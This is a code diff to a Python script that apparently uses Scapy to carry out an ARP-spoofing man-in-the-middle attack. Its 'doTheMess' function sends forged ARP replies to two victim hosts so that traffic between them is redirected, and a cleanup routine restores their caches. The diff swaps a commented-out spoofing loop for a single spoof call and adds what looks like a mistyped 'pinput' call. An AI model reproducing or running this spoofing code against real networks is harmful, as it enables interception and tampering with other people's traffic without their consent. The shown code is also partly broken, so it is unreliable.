@@ -21,13 +21,13 @@ def getMAC(IP, interface):
         return rcv.sprintf(r"%Ether.src%")
 def doTheMess(victim_1ip, victim_2ip, victim1Mac, victim2Mac):
 
-    send(ARP(op=2, pdst=victim_1ip, psrc= victim_2ip, hwdst= victim1Mac))
+    send(ARP(op=2, pdst=victim_1ip, psrc= victim_2ip, hwdst= victim1Mac)) #op=2 because it's a reply
     send(ARP(op=2, pdst=victim_2ip, psrc= victim_1ip, hwdst= victim2Mac))
 
 
 def cleanMess(victim_1ip, victim_2ip, interface):
 
-    print("Cleaning...\n")
+    print("\nCleaning...\n")
     victim1Mac=getMAC(victim_1ip, interface)
     victim2Mac=getMAC(victim_2ip, interface)
 
@@ -96,15 +96,15 @@ def MITM():
     print(victim1Mac)
     print(victim2Mac)
 
-    cleanMess(victim_1ip, victim_2ip, interface)
     print("Doing the mess...\n")
 
-    #while 1:
-     #   try:
-      #      doTheMess(victim_1ip, victim_2ip,victim1Mac, victim2Mac)
-       #     os.system("sleep 2")
-       # except KeyboardInterrupt:
-        #    cleanMess(victim_1ip, victim_2ip, interface)
-         #   break
+    
+    doTheMess(victim_1ip, victim_2ip,victim1Mac, victim2Mac)
+    try:
+        pinput("Type control-c to escape\n")
+    except KeyboardInterrupt:
+        cleanMess(victim_1ip, victim_2ip, interface)
+        pass
+            
 
 MITM()
